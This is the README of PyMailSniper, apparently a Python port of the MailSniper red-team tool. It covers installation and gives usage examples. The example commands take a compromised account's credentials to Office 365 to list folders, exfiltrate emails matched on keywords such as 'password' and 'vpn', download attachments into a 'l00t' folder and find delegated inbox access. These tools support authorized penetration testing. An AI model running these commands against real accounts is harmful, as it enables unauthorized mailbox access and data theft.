# Acknowledgments

This project was orignally inspired by:

* dafthack (https://github.com/dafthack/MailSniper)

# Motivation

I wanted to get better at writing code in python and decided the best way to do that is to write something useful. I wanted to implement functionality of MailSniper using python and found the library by ecederstrand mentioned below. This made porting some features of MailSniper to python super easy.

* ecederstrand (https://github.com/ecederstrand/exchangelib)

# Installation

I have designed it to run inside pipenv, but you can use whatever you like. There is a requirements.txt so there is that

This should be enough to get a pipenv setup

```python
pipenv install
```

# Documentation

1. Help Menu
   
   ``` python
   python3 pymailsniper.py -h

      _____       __  __       _ _  _____       _
     |  __ \     |  \/  |     (_) |/ ____|     (_)
     | |__) |   _| \  / | __ _ _| | (___  _ __  _ _ __   ___ _ __
     |  ___/ | | | |\/| |/ _` | | |\___ \| '_ \| | '_ \ / _ \ '__|
     | |   | |_| | |  | | (_| | | |____) | | | | | |_) |  __/ |
     |_|    \__, |_|  |_|\__,_|_|_|_____/|_| |_|_| .__/ \___|_|
             __/ |                               | |
            |___/                                |_|




    PyMailSniper v0.2 [http://www.foofus.net] (C) sph1nx Foofus Networks <sph1nx@foofus.net>

    usage: python3 pymailsniper.py module [options]

    Python implementation of mailsniper

    optional arguments:
      -h, --help            show this help message and exit

    Modules:
      available modules

      {folders,attachment,delegation,emails}
        folders             List Mailbox Folders
        attachment          List/Download Attachments
        delegation          Find where compromised user has access
        emails              Search for Emails

   ```

2. List Folders (Eg. Inbox is in O365)

    ```python
    python3 pymailsniper.py folders -s outlook.office365.com -e xyz@domain.com -p Password1
    ```

3. Exfiltrate emails

   ```python
    python3 pymailsniper.py emails -s outlook.office365.com -e xyz@domain.com -p Password1 -t vpn,remote,password --field subject -c 100 -o emails.txt
   ```

4. List and/or Download attachments

   ```python
    python3 pymailsniper.py attachment -s outlook.office365.com -e xyz@domain.com -p Password1 -t vpn,remote,password --field subject -c 100 -d l00t
   ```

5. Check if compromised account has delegated rights to any other inboxes

   ```python
    python3 pymailsniper.py attachment -s outlook.office365.com -e xyz@domain.com -p Password1 -g list-of-emails.txt
   ```

# Things to Do

* Add functionality for extracting AD usernames
* Add functionality to dump GAL